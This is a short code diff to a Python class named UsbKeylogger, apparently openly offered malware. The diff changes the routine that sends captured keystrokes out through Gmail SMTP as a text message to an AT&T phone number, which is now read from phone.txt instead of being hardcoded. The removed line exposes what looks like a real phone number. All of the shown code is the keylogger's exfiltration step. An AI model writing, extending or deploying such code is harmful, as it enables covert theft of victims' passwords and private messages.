@@ -64,7 +64,10 @@ class UsbKeylogger:
         text = smtplib.SMTP(host = "smtp.gmail.com", port = 587) # Port 587 is used encrypt SMTP messages using TLS
         text.starttls() # Starts TLS for security
         text.login(address, password) # Logs into the email with provided address and password
-        text.sendmail(address, '9733568278@mms.att.net', txtBody) # Sends a text of the keylogs the specified AT&T phone number from gmail address
+        with open("phone.txt") as f: # Opens phone.txt file
+            phoneNumber = f.readline().rstrip() # Reads the first line, which a AT&T phone number (no hyphens)
+        phoneMail = "" + phoneNumber + "@mms.att.net" # Creates a string variable that combined phone number from file with correlating AT&T email domain
+        text.sendmail(address, phoneMail, txtBody) # Sends a text of the keylogs the specified AT&T phone number from gmail address
         text.quit() # Terminates the text server
 
     # def reportDiscord(self):
